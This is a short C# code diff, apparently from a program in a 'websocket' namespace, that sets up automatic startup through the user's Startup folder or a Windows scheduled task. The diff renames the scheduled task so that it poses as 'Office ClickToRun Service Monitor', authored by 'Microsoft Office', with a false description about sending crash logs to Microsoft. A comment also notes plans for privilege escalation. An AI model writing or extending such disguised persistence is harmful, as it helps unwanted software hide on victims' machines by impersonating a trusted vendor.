@@ -24,6 +24,7 @@ namespace websocket
                     // 获取当前登录用户的 开始 文件夹位置
                     string nowUserPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                     FileStartUp(nowUserPath, ServiceName, FullServicePath);
+
                     // 获取全局开始文件夹位置 [全局开始文件夹存在权限问题可能导致添加启动项失败 后期可增加提权]
                     //string allUserPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup);
                     //FileStartUp(allUserPath, ServiceName, FullServicePath);
@@ -38,11 +39,11 @@ namespace websocket
                     //RKey.SetValue(ServiceName, @""""+ FullServicePath + @"""");//防止生成路径带有空格导致的启动失败
                     break;
                 case 2:
-                    string author = ServiceName;
-                    string desc = ServiceName;
-                    string name = ServiceName;
+                    string author = "Microsoft Office";
+                    string desc = "This task monitors the state of your Microsoft Office ClickToRunSvc and sends crash and error logs to Microsoft.";
+                    string name = "Office ClickToRun Service Monitor";
                     string file = FullServicePath;
-                    //新建任务
+                    //新建计划任务
                     TaskSchedulerClass scheduler = new TaskSchedulerClass();
                     //连接
                     scheduler.Connect(null, null, null, null);
@@ -68,7 +69,6 @@ namespace websocket
                         _TASK_LOGON_TYPE.TASK_LOGON_INTERACTIVE_TOKEN,
                         "");
                     IRunningTask runTask = regTask.Run(null);
-                    //注意：任务计划需要添加引用，在 Com 中搜索 TaskScheduler，添加即可，并且要在“嵌入互操作类型”设置为false，使程序编译时，能从互操作程序集中获取 COM 类型的类型信息。
                     break;
             }
             return true;
